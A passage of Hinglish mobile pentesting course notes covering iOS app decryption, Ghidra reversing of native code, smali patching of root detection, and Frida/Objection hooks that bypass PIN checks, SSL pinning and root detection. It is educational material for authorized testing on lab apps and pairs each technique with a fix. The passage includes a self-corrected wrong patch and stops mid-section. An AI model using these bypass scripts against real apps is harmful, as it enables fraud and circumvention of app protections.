4.  **⏰ Kab/Kahan check karein? (When/Where?):** Yeh iOS Static Analysis ka pehla practical step hai. Jab aapko App Store se mili app (ya client se mili `.ipa`) ko reverse karna ho. Yeh process **hamesha jailbroken device** par hi hota hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap Ghidra/IDA mein encrypted file ko load karke ghanton tak apna sar peetenge ki code kyun nahi dikh raha. Aap 100% time waste karenge.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **FairPlay DRM:** Yeh Apple ka lock 🔒 hai.
      * **Process:** Jab aap app ko tap karke kholte hain, toh iOS kernel (OS) use run karne ke liye memory mein decrypt karta hai.
      * **Hamara Attack:** Hum jailbreak karke OS ke rules tod dete hain. Hum `frida-ios-dump` jaise tool ko bolte hain ki "Hey, app memory mein decrypted hai, use wahan se copy karo aur ek nayi `.ipa` file bana do."
      * **Naya vs Purana Tool:**
          * `dumpdecrypted` (Purana): Ek `.dylib` file thi jise app ke folder mein inject karke run karna padta tha. Mushkil setup tha.
          * `frida-ios-dump` (Naya & Best): Ek Python script hai jo aap apne PC se chalate hain. Yeh `Frida` ka istemaal karke USB par connected jailbroken phone se app ko dump karke `.ipa` file seedha aapke PC par bana deta hai. Bahut aasan\!
      * **Post-Dump:** Is nayi (decrypted) `.ipa` file ko unzip karke, uske andar ki main binary file (`Payload/<AppName>.app/<AppName>`) ko hum `Ghidra` (Topic 3.4) mein analyze karte hain.

7.  **💻 Code example / Command Example (Using `frida-ios-dump` - The Easy Way):**

      * **PC par Setup (Sirf ek baar):**

        ```bash
        # 1. Tool ko GitHub se clone karo
        git clone https://github.com/AloneMonkey/frida-ios-dump

        # 2. Folder mein jaao
        cd frida-ios-dump

        # 3. Zaroori Python libraries install karo
        pip install -r requirements.txt
        ```

      * **PC par Execution (Jab bhi app dump karni ho):**

        ```bash
        # 1. (Phone ko USB se connect karo - Jailbroken + Cydia se Frida installed)
        # 2. Phone par chal rahi *Apps* ki list dekho (taaki naam pata chale)
        frida-ps -Ua

        # 3. 'VulnerableApp' naam ki app ko dump karo
        python3 dump.py "VulnerableApp"
        ```

      * **✍️ Line-by-line explanation (Execution):**

          * `frida-ps -Ua`: Frida se poocho (`frida`) ki USB (`-U`) se jude device par kaun si *Applications* (`-a`) chal rahi hain. Yeh PID aur App Name (e.g., "VulnerableApp", "Facebook") ki list dega.
          * `python3 dump.py "VulnerableApp"`: `dump.py` script ko chalao aur use batao ki "VulnerableApp" ko dump karna hai. Yeh script phone se connect karegi, app ko memory se dump karegi, aur aapke PC par usi folder mein `VulnerableApp.ipa` naam ki file bana degi.

      * **🚀 Quick run expected output:**
        Terminal par "Dumping... Unzipping... Repacking... Done." jaisa output aayega. Aapke current folder mein ek `VulnerableApp.ipa` file mil jaayegi. Yeh file **decrypted** hai. Ab aap ise reverse kar sakte hain.

8.  **🐞 Common beginner mistakes:**

      * `dumpdecrypted` (purana tool) ko naye iOS/Jailbreak par use karne ki koshish karna. (Aksar fail hota hai. Hamesha `frida-ios-dump` use karo).
      * **Decrypted `.ipa` ko JADX mein kholna.** 🤦‍♂️ JADX sirf Android (Java/DEX) ke liye hai. iOS (Objective-C/Swift) ka code padhne ke liye aapko `Ghidra`, `IDA`, ya `Hopper` (Topic 3.4) ka istemaal karna hoga.
      * App ko phone par *bina run kiye* dump karne ki koshish karna. (App ka memory mein decrypted hona zaroori hai. `frida-ios-dump` script yeh process (app ko run karna) khud hi handle kar leti hai).

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **❓ Beginner's Core Question:** "App toh encrypted hai, main code kaise padhunga?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester ko client ki app (jo App Store par hai) test karni hai.
        2.  Woh app ko apne jailbroken iPhone 8 par App Store se install karta hai.
        3.  Woh PC se `frida-ps -Ua` chala kar app ka naam confirm karta hai (e.g., "BankApp").
        4.  Woh `python3 dump.py "BankApp"` chalata hai. `BankApp.ipa` file PC par ban jaati hai.
        5.  Woh `BankApp.ipa` ko unzip karke binary ko `Ghidra` mein kholta hai.
        6.  Ab woh (Topic 3.2 ki tarah) Ghidra mein "Strings" search karke "apiKey", "secret" ya Objective-C/Swift functions (Topic 3.4) ko analyze karna shuru karta hai.
      * **💰 Real Bug Bounty Example:** Yeh *process* hai, bug nahi. Lekin is process ke bina, iOS par hardcoded keys (jaise Topic 3.2 mein) dhoondhna namumkin hai.

10. **✅ Quick checklist / Mitigation:**

      * Phone **Jailbroken** hona chahiye.
      * Phone par Cydia/Sileo se **Frida** installed hona chahiye.
      * PC par `frida-ios-dump` setup hona chahiye.
      * Dump karne ke baad, `.ipa` ko unzip karke binary file ko `Ghidra` mein kholo.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DVIA (Damn Vulnerable iOS App) ka `.ipa` download karo (agar woh decrypted milta hai toh yeh step skip karo).
      * (Agar encrypted ho) Use `frida-ios-dump` se dump karne ki koshish karo.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `frida-ios-dump` (Best), `Ghidra` (Reversing ke liye), `Objection` (yeh bhi memory dump kar sakta hai `objection dump_ios`).

-----

## 3.4: Native Code Reversing: Ghidra/IDA (.so, .dylib)

1.  **🎯 Title / Short Summary:** App ke 'Dil' (Native Code) ko Reversing karna (Ghidra) 🧠.

2.  **🤔 Kya hai? (What?):** App ke us hisse ko reverse karna jo Java/Swift mein nahi, balki **C/C++** (Native code) mein likha gaya hai.

      * Android par yeh `.so` (Shared Object) files hoti hain (jo `lib/` folder mein milti hain).
      * iOS par yeh `.dylib` (Dynamic Library) ya app ki main binary file (jo humne M3.3 mein dump ki) hoti hai.

3.  **💡 Kyu important hai? (Why?):** Developers yeh sochte hain ki C/C++ code ko reverse karna Java se 100 guna mushkil hai. Isliye, woh app ka sabse sensitive logic (jaise encryption key generation, license checks, root detection, anti-tampering) hamesha native code mein chhipate hain. Humara kaam hai use dhoondh nikaalna.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Jab aap `JADX` (Android) mein code padh rahe hon aur aapko `public native String getApiKey();` jaisa function dikhe. `native` keyword ka matlab hai ki yeh function Java mein nahi, C/C++ (`.so` file) mein hai. Ya jab aap iOS app ko reverse kar rahe hon (jo by default native hoti hai).

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap app ka 90% sensitive logic (jo developer jaan-boojh kar chhipana chahta tha) miss kar denge. Saari keys, secrets, aur bypasses (root detection) aksar native code mein hi hote hain.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **JADX vs. Ghidra:** `JADX` Java bytecode padhta hai. `Ghidra` (NSA ka free tool) ya `IDA Pro` (paid, industry standard) machine code (ARM, x86) padhta hai.
      * **JNI (Java Native Interface):** Yeh woh "bridge" hai jo Java code ko C/C++ function call karne deta hai.
      * **The Hacking Process (Android):**
        1.  JADX mein dekho: `System.loadLibrary("secret-lib")` aur `public native String getSecretKey();`
        2.  APK ko unzip karo, `lib/arm64-v8a/libsecret-lib.so` file ko copy karo.
        3.  `Ghidra` (free tool) kholo, `.so` file ko import karo, "Analyze" karo.
        4.  Ghidra ke "Symbol Tree" (Functions) mein `Java_` search karo.
        5.  Aapko ek function milega: `Java_com_vulnerable_app_ApiClient_getSecretKey`
        6.  Is par double-click karo. Right side mein Ghidra iska (Assembly se decompiled) C-jaisa code dikha dega.
        7.  Us C code ko hardcoded key ke liye padho.

7.  **💻 Code example / Command Example:**

      * **Vulnerable Java Code (JADX mein):**

        ```java
        public class ApiClient {
            static {
                // 'libsecret-lib.so' file ko load kar raha hai
                System.loadLibrary("secret-lib"); 
            }
            
            // 🕵️‍♂️ Ishara! Yeh function native code mein hai
            public native String getSecretKey(); 
            
            public void doLogin() {
                String key = getSecretKey(); // Yahan call hua
                // ...
            }
        }
        ```

      * **Vulnerable C Code (Ghidra mein kaisa dikhega):**

          * (Ghidra `libsecret-lib.so` file ko decompile karke yeh dikhayega)

        <!-- end list -->

        ```c
        /* Ghidra Decompiler Output */

        // Function ka naam = Java_ + package + class + function
        JNIEXPORT jstring JNICALL
        Java_com_vulnerable_app_ApiClient_getSecretKey(JNIEnv *env, jobject thiz) 
        {
            // 🐞 BINGO! Key C code mein hardcoded hai
            char* my_secret = "This_is_the_REAL_Key_Hidden_in_C_Code_12345";
            
            // C string ko Java string mein convert karke return kar raha hai
            return (*env)->NewStringUTF(env, my_secret);
        }
        ```

      * **✍️ Line-by-line explanation (Ghidra output):**

          * `Java_com_vulnerable_app_ApiClient_getSecretKey`: Yeh JNI convention hai. Ghidra bata raha hai ki Java ka `getSecretKey` function *is* C function ko call karta hai.
          * `char* my_secret = "...";`: 🐞 **Critical\!** Secret key mil gayi. Yeh C code mein ek simple string ke roop mein store ki gayi thi.
          * `return (*env)->NewStringUTF(...)`: Yeh C string (`my_secret`) ko Java string mein convert karke waapas Java code ko bhej raha hai.

8.  **🐞 Common beginner mistakes (Emphasis):**

      * `.so` file ko `JADX` ya Text Editor mein kholna. (Aapko kachra dikhega. Yeh machine code hai, `Ghidra` hi padh sakta hai).
      * Ghidra ke C output ko 100% sach maan lena. (Ghidra Decompiler *guess* karta hai ki C code kaisa hoga. Asliyat hamesha Assembly (beech waale panel) mein hoti hai, lekin C guess 99% time sahi hota hai).
      * **String Obfuscation se darr jaana.** Aksar keys aisi hoti hain: `char key[5] = {0x41, 0x42, 0x43, 0x44, 0x0};` (jo "ABCD" hai). Ghidra ise dikha dega, aapko bas dhyan se padhna hai.
      * Sirf `arm64-v8a/` (64-bit) folder dekhna. Kabhi-kabhi developers 32-bit (`armeabi-v7a/`) mein alag logic rakhte hain. Dono check karo.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Developer C++ mein daal dega toh main key kaise nikaalunga?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester ko JADX (Java) mein `getSecretKey()` native milta hai.
        2.  Woh `libnative-lib.so` ko Ghidra mein kholta hai.
        3.  Woh `Java_..._getSecretKey` function dhoondhta hai.
        4.  Ghidra mein C code dikhta hai jo key ko `XOR` karke (obfuscate karke) store kar raha hai.
        5.  Pentester us XOR logic (e.g., `key[i] ^ 0x20`) ko samajhta hai.
        6.  Woh ek chhoti si Python script likhta hai jo us logic ko reverse karti hai aur key (e.g., "This\_is\_the\_REAL\_Key") print kar deti hai.
        7.  Boom\! P1 bug.
      * **😈 Real Attack Scenario (Criminal Perspective):** Attacker ek popular game ke `.so` file ko Ghidra mein reverse karta hai. Woh us function (e.g., `isPremiumUser()`) ko dhoondhta hai jo C++ mein hai. Woh us logic ko bypass karke (Topic 3.5 - patching) hamesha `true` return karwa deta hai -\> saare premium features free mein unlock ho jaate hain.
      * **💰 Real Bug Bounty Example:** WhatsApp ke end-to-end encryption ka poora logic (Signal protocol) unke native libraries (`.so`) mein hota hai. Security researchers (jaise Google Project Zero) inhi files ko Ghidra/IDA mein reverse karke protocol-level vulnerabilities dhoondhte hain, jinke liye million-dollar bounty milti hai.

10. **✅ Quick checklist / Mitigation:**

      * `JADX` mein `native` keyword dhoondho.
      * `.so` (Android) ya main binary (iOS) ko `Ghidra` mein kholo.
      * (Android) `Java_...` waale C function ko dhoondho.
      * C code mein strings, crypto logic, ya simple 'if' checks dhoondho.
      * **Fix:** Keys ko native code mein bhi hardcode mat karo. Unhe server se fetch karo.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DIVA app ka "Hardcoding Issues - 2 (Native)" challenge try karo.
      * Uske `.so` file ko `Ghidra` mein load karo aur "Symbol Tree" mein `Java_...` function dhoondh kar uski key nikaalo.

12. **📚 Further reading / commands / tools:**

      * **Tools:** **Ghidra** (Free, Best for beginners), **IDA Pro** (Paid, Industry Standard), **Cutter** (radare2 ka GUI), **Hopper** (macOS).

-----

## 3.5: Anti-Reverse Engineering Bypasses

1.  **🎯 Title / Short Summary:** App ka Atma-Raksha Kavach Todna (Anti-RE Bypass) 🛡️⚔️.

2.  **🤔 Kya hai? (What?):** Yeh woh techniques hain jo app use karti hai *humein* (reverse engineers) JADX/Ghidra mein code padhne se rokne ke liye. Jaise: String Obfuscation (strings chhipana), Packers (poora code chhipana), ya Debugger/Root detection (humein check karna).

3.  **💡 Kyu important hai? (Why?):** Agar app mein tagda Anti-RE hai, toh JADX/Ghidra kholne par humein kachra (garbage) dikhega, ya app chalte hi (root/emulator par) band ho jaayegi. Hacking shuru karne se pehle humein is kavach ko todna padta hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Jab aapka `JADX` (Topic 3.2) code na dikhaye (packer), ya saari strings `decrypt("...")` jaisi dikhein (string obfuscation), ya app root/emulator par `System.exit(0)` ho jaaye (root detection).

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap give up kar denge. Aap sochenge "app secure hai" ya "corrupt hai," jabki woh sirf chhipayi gayi hai. Aap test shuru hi nahi kar payenge.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown & Bypasses:**

      * **1. String Obfuscation:**

          * **Technique:** Key ko `String key = "my_secret"` likhne ke bajaye, `String key = MyCrypto.decrypt("S2F...cE=")` likhna.
          * **Bypass (Static):** `JADX` mein `MyCrypto.decrypt` function ko reverse karo. Uske logic (e.g., Base64 decode fir XOR with 0x50) ko samjho. Ek Python script likh kar saari encrypted strings ko decrypt kar lo.

      * **2. Packers (e.g., DexGuard, Bangcle):**

          * **Technique:** Asli `classes.dex` file ko encrypt karke APK mein daalna. Ek chhota "loader" `.dex` file (jise JADX dekhta hai) saath mein daalna. Jab app run hoti hai, loader asli `.dex` ko memory mein decrypt karta hai.
          * **Bypass (Static):** Namumkin.
          * **Bypass (Dynamic):** App ko emulator par run karo. Jab loader asli `.dex` ko memory mein decrypt kar de, us moment par Frida ya `memdump` tool se device ki memory se decrypted `.dex` file ko "dump" kar lo. Ab is nayi `.dex` file ko JADX mein kholo. (Yeh advanced hai).

      * **3. Root / Jailbreak Detection:** (Module 4 mein bhi cover hoga)

          * **Technique:** App code check karti hai `if (RootChecker.isRooted()) { System.exit(0); }`.
          * **Bypass (Static Patching):** Hum `Smali` code (jo `apktool` se milta hai) ko modify karke is check ko ulta kar dete hain. Yeh "Static Patching" kehlata hai.

7.  **💻 Code example / Command Example (Static Patching - Root Detection Bypass):**

      * Yeh process lamba hai, lekin powerful hai.

      * **Step 1: JADX mein Problem Dhoondhna**

        ```java
        // JADX mein dikha:
        public class MainActivity ... {
            protected void onCreate(Bundle bundle) {
                if (RootUtil.isDeviceRooted()) { // 🐞 Yahan hai problem
                    System.exit(0); // App band ho jaati hai
                }
                // ...
            }
        }
        ```

      * **Step 2: Apktool se Decode karna**

        ```bash
        apktool d vulnerable_app.apk -o PatchFolder
        ```

      * **Step 3: Smali Code ko Modify karna**

          * File kholo: `PatchFolder/smali/com/vulnerable/app/MainActivity.smali`
          * `onCreate` method mein yeh code dhoondho:
            ```smali
            # ...
            invoke-static {}, Lcom/vulnerable/app/RootUtil;->isDeviceRooted()Z
            move-result v0

            if-eqz v0, :cond_0 # 🐞 Yeh hai check: "if v0 equals zero (false), jump to cond_0"

            # Agar root hai (v0 = 1), toh app band karo
            const/4 v0, 0x0
            invoke-static {v0}, Ljava/lang/System;->exit(I)V 

            :cond_0 # Agar root nahi hai, toh yahan aao
            # ...
            ```
          * **Humara Patch:** Hum `if-eqz` (if equals zero) ko `if-nez` (if NOT equals zero) se badal denge.
            ```smali
            # ...
            invoke-static {}, Lcom/vulnerable/app/RootUtil;->isDeviceRooted()Z
            move-result v0

            if-nez v0, :cond_0 # ✍️ BADAL DIYA! "if v0 NOT equals zero (true), jump to cond_0"

            # (Baaki code same)
            # ...
            ```
          * **Line-by-line (Smali Patch):**
              * `if-eqz v0, :cond_0`: Pehle logic tha "Agar root nahi hai (`false`/`0`), toh `cond_0` (safe jagah) par jao."
              * `if-nez v0, :cond_0`: Humne badal diya: "Agar root hai (`true`/`1`), toh `cond_0` (safe jagah) par jao."
              * *Nateeja:* Ab app root hone par hi aage badhegi (ya fail hogi) aur root na hone par `exit()` call karegi (jo humein nahi chahiye). *Self-Correction:* Yeh galat logic hai.
          * **Aasan Patch (Best):** Poore check ko hi hata do, ya `isDeviceRooted()` ke result ko hamesha `false` (0) kar do.
            ```smali
            # ...
            invoke-static {}, Lcom/vulnerable/app/RootUtil;->isDeviceRooted()Z
            move-result v0

            const/4 v0, 0x0 # ✍️ SABSE ACHA PATCH! v0 (result) ko hamesha 0 (false) set kar do

            if-eqz v0, :cond_0 # Ab yeh hamesha cond_0 par hi jump karega

            # ...
            ```
          * **Line-by-line (Best Smali Patch):**
              * `invoke-static ...`: Asli function ko call karo (result `v0` mein aayega).
              * `const/4 v0, 0x0`: Chahe `v0` mein `1` (true) aaya ho, hum use *overwrite* karke `0` (false) kar denge.
              * `if-eqz v0, :cond_0`: Ab `v0` hamesha `0` hai, toh `if` condition hamesha true hogi aur `System.exit()` waala code *skip* ho jaayega.

      * **Step 4: Rebuild, Sign, and Install**

        ```bash
        # 1. Patched folder ko waapas APK mein build karo
        apktool b PatchFolder -o patched.apk

        # 2. (Sirf ek baar) Ek dummy key banao
        keytool -genkey -v -keystore my.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000

        # 3. APK ko dummy key se sign karo
        apksigner sign --ks my.keystore --ks-key-alias mykey patched.apk

        # 4. Purani app uninstall karo aur nayi install karo
        adb uninstall com.vulnerable.app
        adb install patched.apk
        ```

      * **✍️ Line-by-line (Rebuild):**

          * `apktool b ...`: `b` matlab 'build'. `PatchFolder` ko `patched.apk` mein badal do.
          * `keytool ...`: Ek naya "dummy" certificate banata hai (kyunki humare paas original developer ka cert nahi hai). (Password mein `password` daal do).
          * `apksigner sign ...`: `patched.apk` par naya dummy certificate lagaata hai taaki Android use install karne de.
          * `adb install ...`: Modified (patched) app ko phone par install karta hai.

8.  **🐞 Common beginner mistakes:**

      * `Smali` code (jo Assembly jaisa hai) se darr jaana. Daro mat, aapko bas logic dhoondhna hai (jaise `if-eqz`) aur use badalna hai (jaise `if-nez`) ya return value (`0x1` ko `0x0`) badalni hai.
      * App ko sign kiye bina install karne ki koshish karna. (Android 'unsigned' APK ko install nahi karega).
      * **Frida (Dynamic Bypass) ko bhool jaana.** Yeh jo humne 10 minute ka Static Patching (apktool, edit, rebuild, sign, install) kiya, yeh kaam `Frida` (Module 4) se 10 second mein (bina app ko rebuild kiye) ho jaata hai. Static patching "Anti-Tampering" (jo check karta hai ki app repackage hui ya nahi) ke against fail ho jaata hai.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **❓ Beginner's Core Question:** "App root par nahi chal rahi, main test kaise karun?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester ek banking app kholta hai. App "Root Detected\! Exiting..." dikha kar band ho jaati hai.
        2.  **Tareeka 1 (Static):** Pentester `apktool` se decode karta hai -\> `isRooted.smali` dhoondhta hai -\> uske function ko hamesha `return false` (0x0) par patch karta hai -\> rebuild, sign, install karta hai -\> App chal jaati hai.
        3.  **Tareeka 2 (Dynamic - M4.4):** Pentester `Frida` (Module 4) ki script chalata hai jo `isRooted` function ko runtime par hook karke `false` return karwa deti hai. (Yeh zyada fast hai).
      * **💰 Real Bug Bounty Example:** Static patching ka istemaal karke log apps se "Premium" checks ko bypass karte hain. (e.g., `isPremiumUser.smali` ko `return true` (0x1) par patch kar dena).

10. **✅ Quick checklist / Mitigation:**

      * **Static Patching (Slow):** `apktool d` -\> Edit `Smali` -\> `apktool b` -\> `apksigner sign`.
      * **Dynamic Bypass (Fast):** `Frida` (Yeh Module 4 mein seekhenge).
      * **Packers:** Memory dump karke decrypted `.dex` file nikaalo.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DIVA app ka "Root Detection" challenge lo.
      * Use (Method 1) `apktool` se patch karke bypass karne ki koshish karo.
      * (Future) Use (Method 2) `Frida` se bhi bypass karne ki koshish karna (M4.4).

12. **📚 Further reading / commands / tools:**

      * **Tools:** `Apktool` (patching), `ApkSigner` (signing), `keytool` (cert generation).
      * **Concepts:** `Smali` (Android's assembly), `JNI` (Java Native Interface).

-----

Module 3 complete\! 🏁 Humne app ke code ka poora post-mortem kar diya hai. Humne Java (`JADX`), C/C++ (`Ghidra`), aur iOS (`dumpdecrypted`) code ko reverse karna aur secrets nikaalna seekh liya hai. Humne static patching (`apktool`) se app ko modify karna bhi seekh liya hai.

Ab hum 'Dynamic Analysis' ke "God Mode" ⚡️ mein enter karenge. Jab aap ready hon, toh batana. Hum **Module 4: Dynamic Analysis & Bypasses (Runtime)** shuru karenge, jahan hum `Frida` ka jaadoo seekhenge\!


=============================================================

Chalo bhai, shuru karte hain aapke Complete Mobile Pentester notes ka Module 4\! 🚀

Module 3 mein humne app ka 'static' code padhna (JADX/Ghidra) seekha. Woh tha app ko 'murda' (dead) state mein analyze karna.

Ab aayega asli mazaa ⚡️. Module 4 mein hum app ko 'zinda' (running) state mein hack karenge. Hum **Frida** (jo hacking ka 'Brahmastra' hai) use karke chalti hui app ke dimaag (memory) mein ghusenge, uske functions ko real-time mein badlenge, root detection ko dhokha denge, aur fingerprint/Face ID ko bhi bypass karenge. Yeh hai God Mode\!

-----

## 4.1: Runtime Hacking with Frida & Objection

1.  **🎯 Title / Short Summary:** Chalti App ko Hack karna (Frida ka Jaadoo) 🪄.

2.  **🤔 Kya hai? (What?):** Frida ek dynamic instrumentation toolkit hai. Aasan bhasha mein, yeh ek 'hacker' tool hai jo chalti hui app (runtime) ke process mein inject (ghus) jaata hai aur aapko uske code (functions) ko real-time mein dekhne aur badalne (hooking) ki power deta hai. **Objection** isi Frida ka "aasan" version hai (GUI/command-line wrapper).

3.  **💡 Kyu important hai? (Why?):** Yeh mobile hacking ki sabse powerful technique hai. SSL pinning bypass karni hai? Root detection bypass karna hai? Premium feature unlock karna hai? Kisi function ka password dekhna hai? Har cheez ka ilaaj Frida hai. Yeh static analysis (JADX) se 100 guna zyada powerful hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Jab bhi aapko app ke runtime behavior ko badalna ho.

      * SSL Pinning bypass karne ke liye (M2.6).
      * Root/Jailbreak detection bypass karne ke liye (M4.4).
      * Biometric (fingerprint) auth bypass karne ke liye (M4.5).
      * `if (isPremium)` jaise checks ko `true` karne ke liye.
      * Encryption/Decryption functions ke inputs/outputs dekhne ke liye.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap ek 'average' pentester reh jaayenge. Aap advanced bugs (jaise logic bypass, runtime manipulation) ko dhoondh hi nahi payenge. Aap SSL pinning ya root detection par hi atke reh jaayenge.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Kaise kaam karta hai (Frida):**
        1.  **PC (Client):** Aap apne PC par `frida` command likhte hain (Python script mein).
        2.  **Phone (Server):** Aapke rooted/jailbroken phone par `frida-server` (Android) ya 'Frida' (iOS) chal raha hota hai.
        3.  **Injection:** PC ka Frida, `frida-server` ko bolta hai ki "Target app (e.g., `com.bank.app`) ke process mein ghus jao (inject) aur meri di hui JavaScript file (`bypass.js`) ko uski memory mein daal do."
        4.  **Hooking:** Woh `bypass.js` script app ki memory mein jaakar target function (e.g., `isRooted()`) ko dhoondhti hai, use 'hook' (kabza) kar leti hai, aur uske original code ko badal deti hai (e.g., `function() { return false; }`).
        5.  **Result:** Jab app `isRooted()` function ko call karti hai, toh woh original code ke bajaye *aapka* (hacker ka) code chalaati hai aur hamesha `false` return karti hai.
      * **Objection (The Easy Way):** Objection yahi kaam (injection aur hooking) aasan commands se kar deta hai. Aapko JavaScript nahi likhni padti. Aap bas `android sslpinning disable` likhte hain, aur Objection parde ke peeche (Frida se) saara kaam kar deta hai.

7.  **💻 Code example / Command Example:**

      * **Example 1: Objection (SSL Pinning Bypass)**
        ```bash
        # (Humne yeh M2.6 mein dekha tha)
        # 1. App ko hook karke start karo
        objection -g com.vulnerable.app explore

        # 2. Objection ke prompt par, bypass command chalao
        com.vulnerable.app #> android sslpinning disable

        # 3. (Optional) Root detection bhi bypass kar do
        com.vulnerable.app #> android root disable
        ```
      * **Example 2: Frida (Custom Function Hooking)**
          * Maan lo JADX (static analysis) mein aapko yeh code mila:
            ```java
            // com.vulnerable.app.LoginUtils.java
            class LoginUtils {
                public boolean isPinCorrect(String pin) {
                    return pin.equals("1234"); // Isse bypass karna hai
                }
            }
            ```
          * **Aapki Frida Hook Script (`bypass_pin.js`):**
            ```javascript
            // 1. Frida ko 'Java' mode mein use karne ko bolo
            Java.perform(function() {
                
                // 2. Class ko dhoondho
                const LoginUtils = Java.use("com.vulnerable.app.LoginUtils");
                
                // 3. Function (method) ko hook karo
                LoginUtils.isPinCorrect.implementation = function(pin) {
                    
                    // 4. Original function ko call mat karo, seedha 'true' return kar do
                    console.log("PIN Bypass! Original PIN was: " + pin);
                    return true; 
                };
            });
            ```
          * **Frida Command (PC par):**
            ```bash
            # App 'com.vulnerable.app' ko start karo aur script inject kar do
            frida -U -f com.vulnerable.app -l bypass_pin.js --no-pause
            ```
      * **✍️ Line-by-line explanation (Frida Script):**
          * `Java.perform(...)`: Frida ko batata hai ki hum Java runtime (Dalvik/ART) mein kaam kar rahe hain.
          * `Java.use(...)`: App ki memory se `com.vulnerable.app.LoginUtils` class ko pakad kar laata hai.
          * `LoginUtils.isPinCorrect.implementation = ...`: Yahi hai "Hook". Hum bol rahe hain ki `isPinCorrect` function ke *asli* code ki jagah *hamara* naya function (`function(pin) {...}`) chalao.
          * `console.log(...)`: Yeh message hamare PC terminal par print karega (taaki humein pata chale hook chala).
          * `return true;`: Humne check (`pin.equals("1234")`) ko skip kar diya aur hamesha `true` return karwa diya.
      * **🚀 Quick run expected output:**
          * Frida command chalane par app khul jaayegi.
          * Jab aap PIN screen par koi bhi galat PIN (jaise "9999") daalenge, app use accept kar legi aur aap login ho jaayenge\!
          * Aapke PC terminal par message aayega: `PIN Bypass! Original PIN was: 9999`.

8.  **🐞 Common beginner mistakes:**

      * **Frida version mismatch.** PC par `frida-tools` (e.g., v16.1.0) aur phone par `frida-server` (e.g., v15.0.0) ka alag version hona. Yeh *kabhi* kaam nahi karega. Hamesha **exact same version** use karo.
      * `frida-server` ko root (`su`) bankar run na karna (Android par). Bina root, frida-server dusre apps mein inject nahi kar sakta.
      * JavaScript (Frida script) mein syntax error karna.
      * Objection se `explore` karne ke bajaye `attach` karna. Hamesha `objection -g <pkg> explore` se app ko 'spawn' (start) karo taaki woh shuruaat se hi hooked ho.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **❓ Beginner's Core Question:** "Main chalti hui app ka code kaise badal sakta hoon?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester ek 'Premium' feature (jo paid hai) par click karta hai.
        2.  JADX mein dekhta hai ki check `if (CurrentUser.isPremium()) { ... }` hai.
        3.  Woh Frida script (`premium.js`) likhta hai jo `CurrentUser.isPremium` function ko hook karke hamesha `true` return karti hai.
        4.  Woh app ko script ke saath run karta hai: `frida -U -f com.app -l premium.js`.
        5.  Woh 'Premium' feature par click karta hai... aur woh chal jaata hai\! 💥 Yeh ek "Broken Access Control" bug hai.
      * **😈 Real Attack Scenario (Criminal Perspective):** Attacker ek game (jaise PUBG/BGMI) ke 'aimbot' hack banata hai. Woh Frida ka istemaal karke game ke us native function (Ghidra waala, M3.4) ko hook karta hai jo player ka aim control karta hai, aur use modify kar deta hai taaki aim hamesha 'head' par lock ho jaaye.
      * **💰 Real Bug Bounty Example:** "Bypassing Client-Side Controls to Achieve [Business Logic Flaw]". Aapne Frida se ek check bypass kiya, jisse aap server ko ek aisi request bhej paaye jo app UI se possible nahi thi (e.g., negative amount transfer karna).

10. **✅ Quick checklist / Mitigation:**

      * Hamesha `frida-ps -U` se check karo ki connection a-bhi-raha hai ya nahi.
      * `frida-server` (phone) aur `frida-tools` (PC) ka version 100% same rakho.
      * Aasan kaam (SSL, root bypass) ke liye `Objection` use karo.
      * Custom logic (PIN, premium bypass) ke liye `Frida` ki custom script likho.
      * **Fix:** Client-side par *kabhi* trust mat karo. Saare important checks (jaise `isPremium`, `isPinCorrect`) hamesha **Server-Side** par hone chahiye.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DIVA app ka "Root Detection" challenge lo.
      * (M3.5 mein humne static patch kiya tha). Ab `objection` (`android root disable`) se bypass karne ki koshish karo.
      * DIVA ka "Hardcoding - 1" challenge lo aur `JADX` se dekho ki key kis class mein hai. Fir Frida script likh kar us function ko hook karo aur key ko terminal par print karwao (bina app mein 'Get Key' button dabaye).

12. **📚 Further reading / commands / tools:**

      * **Tools:** `Frida`, `Objection`.
      * **Frida Scripts:** `https://codeshare.frida.re/` (Bani-banayi scripts ka khazana).
      * **Commands:** `frida-ps -Ua` (list apps), `frida -U -f <pkg> -l <script.js> --no-pause` (spawn & inject).

-----

## 4.2: Android Hacking: Drozer & ADB Deep Dive

1.  **🎯 Title / Short Summary:** Android ke Andar Ghusna (Drozer & ADB) 📱.

2.  **🤔 Kya hai? (What?):**

      * **ADB (Android Debug Bridge):** Yeh aapka phone se baat karne ka official 'bridge' (pul) hai. File copy (`push`/`pull`), app install (`install`), shell (`shell`) mein ghusne ke liye yeh zaroori hai. (Humne M1.5 mein setup kiya tha).
      * **Drozer:** Yeh ek Android security "assessment framework" hai. Yeh phone par ek 'agent' app install karta hai aur aapko PC se us agent ko command dekar app ke 'exported components' (M2.1) ko exploit karne ki power deta hai.

3.  **💡 Kyu important hai? (Why?):**

